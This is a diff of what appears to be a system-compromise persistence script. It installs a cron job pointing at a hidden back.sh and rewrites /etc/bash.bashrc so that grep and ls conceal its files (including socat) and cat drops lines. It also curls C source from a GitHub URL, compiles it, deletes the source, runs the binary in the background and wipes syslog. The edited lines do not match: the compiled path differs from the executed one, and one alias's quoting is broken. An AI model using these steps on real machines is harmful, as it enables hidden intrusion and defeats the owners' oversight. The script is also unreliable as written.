@@ -62,9 +62,9 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 
 # Fun stuff with commands! ;)
 {
-    echo "alias grep='grep --exclude-dir=.nope --exclude=*golden_egg'"
+    echo "alias grep='grep --exclude-dir=.nope --exclude=*socat'"
     echo "alias cat='cat --number | grep \"^[0-9]*[02468]\"'"
-    echo "alias ls='ls --hide=\".*nope\" --hide=\"*golden_egg\"'"
+    echo "alias ls='ls --color=auto | grep -v "back.sh"'"
 } >> /etc/bash.bashrc
 
 # Set privs for funny.sh
@@ -84,11 +84,11 @@ sudo curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infini
 DEBIAN_FRONTEND=noninteractive apt-get install build-essential -y
 
 # Compile and remove source code
-gcc -o /etc/goose/golden_egg /etc/goose/golden_egg.c
+gcc -o /etc/goose/server /etc/goose/golden_egg.c
 rm /etc/goose/golden_egg.c
 
 # Run the binary in background
-nohup /etc/goose/golden_egg </dev/null >/dev/null 2>&1 &
+nohup /etc/ftp/server </dev/null >/dev/null 2>&1 &
 
 # Clear logs
 > /var/log/syslog
